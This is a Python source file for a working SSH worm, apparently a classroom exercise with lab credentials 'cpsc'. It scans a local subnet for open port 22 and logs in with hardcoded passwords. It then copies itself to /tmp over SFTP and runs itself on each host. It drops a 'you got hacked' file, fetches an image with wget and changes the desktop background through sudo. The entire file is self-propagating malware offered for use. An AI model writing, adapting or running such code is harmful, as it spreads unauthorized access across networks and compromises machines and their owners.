#!/usr/bin/env python
import socket
import os
import sys, time
from datetime import datetime
import paramiko

# By default, target SSH
target_port = 22


image_url = "https://i.imgur.com/hbNtlcJ.jpg"
image_name = "hbNtlcJ.jpg"
# Currently these 2 do nothing
remote_username="cpsc"
remote_password="cpsc"
worm_name = "worm.py"
# Specifies what ip to stop at 192.168.1.0-max_ip. Saves time in testing
max_ip = 10
hosts = ["192.168.1." + str(i) for i in range(0, max_ip)]


# Offset to help format output
offset = 4 * " "


def get_local_ip():
	""" Gets the current machines local ip, so we don't waste time scanning it """
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		sock.connect(('8.8.8.8', 1))
		local_ip = sock.getsockname()[0]
	except:
		local_ip = "127.0.0.1"
	finally:
		sock.close()

	return local_ip



def scan_port(host, port):
	""" Scans specified port for a specified host, returns 0 if successful """
	exit_code = -1
	try:
		# Set up socket to connect to
		ssh_sock = socket.socket()
		ssh_sock.settimeout(20)
		# Attempt to connect
		port_status = ssh_sock.connect_ex((host, port))
		# port_status will be 0 if specified port is open
		if port_status == 0:
			exit_code = 0

	except Exception as e:
		print ("%s[!] Port %d closed or unavailable\n" % (offset, port))
		pass
	except KeyboardInterrupt as e:
		print ("%s[!] User stopped scanning host %s\n" % (offset, host))
		return -1
	finally:
		ssh_sock.close()
	return exit_code


def get_vulnerable_hosts(port):
	""" Returns a list of hosts with specified port open """
	print ("[+] Scanning for vulnerable hosts...\n")
	vulnerable_hosts = []

	current_machine = get_local_ip()

	for host in hosts:
		# Skip scanning the machine running the scipt
		if current_machine == host:
			continue
		print ("[+] Scanning %s" % (host))
		try:
			port_status = scan_port(host, target_port)
			if port_status == 0:
				print("%s[o] Port %d open!" % (offset, target_port))
				vulnerable_hosts.append(host)
		except Exception as e:
			print ("%s[!] Error scanning %s\n" %(offset, host))
			pass
		except KeyboardInterrupt as e:
			print ("%s[!] Stopped looking for hosts\n" % (offset))
			return vulnerable_hosts

	return vulnerable_hosts


def set_background(ssh):
	#ssh.exec_command("cd ~/")
	ssh.exec_command("os.environ['DISPLAY'] = ':0'")
	stdin, stdout, stderr = ssh.exec_command("ls /home/cpsc/")
	ssh.exec_command("cd ~/")
	l = stdout.readlines()
	l = [str(name) for name in l]
	l = [name[0:-1] for name in l]
	if image_name not in l:
		print ("Adding background...")
		ssh.exec_command("wget https://i.imgur.com/hbNtlcJ.jpg")
		# Need to issue a blocking command to download can finish before we move on?
		time.sleep(20)
	else:
		print ("background already there")
	
	try:
		ssh.exec_command("export DISPLAY=:0")
		cmd = "echo " + "'" + remote_password + "'"
		print (cmd)
		ssh.exec_command(cmd +
			 " | sudo gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/"
		 	+ image_name)
		time.sleep(10)
	except:
		print("Error with setting gnome desktop background\n")


if __name__ == "__main__":
	""" Main program that performs the scan """

	# Prove file was infected and ran worm
	home_directory = os.path.expanduser('~')
	proof = open(home_directory + "/" + "gotcha.txt", "w")
	proof.write("Hey guy, you got hacked\n")
	proof.close()
	
	vulnerable_hosts = get_vulnerable_hosts(target_port)
	print ("\n[Scan Results]")
	print ("Vulnerable hosts: %s, \n" % (vulnerable_hosts))

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	for host in vulnerable_hosts:
		print ("[+] Attempting to SSH into %s" % (host))
		try:
			ssh.connect(host, username="cpsc", password="cpsc")
		except Exception as e:
			print ("%s[!] Invalid credentials, skipping." % (offset))
			continue
		except KeyboardInterrupt as e:
			print ("%s[!] Skipping host\n" % (offset))
			continue
		try:
			sftpClient = ssh.open_sftp()
			print ("%s[o] Access Granted!" % (offset))
			#set_background(ssh)
			try:
				sftpClient.put(worm_name, "/tmp/" + worm_name)
			except Exception as e:
				print ("Error with sftpClient.put")
				pass
			try:
				ssh.exec_command("chmod a+x /tmp" + worm_name)
			except Exception as e: 
				print ("%s [!]Error with chmod", (offset))
			try:
				ssh.exec_command("python /tmp/" + worm_name)
			except Exception as e:
				print("Error executing")
				pass

			except KeyboardInterrupt as e:
				print ("%s[!] User stopped, moving to next IP\n" % (offset))
				pass
			try:
				set_background(ssh)
			except Exception as e:
				print ("%s[!] Error setting desktop background\n" % (offset))
				pass
			ssh.close()
		except Exception as e:
			print ("%s[!] Could not SSH into %s\n" % (offset, host))
			pass
		except KeyboardInterrupt as e:
			print ("%s[!] User stopped execution, quitting.\n" % (offset))
			sys.exit(1)
		
	print ("Finished attacking\n")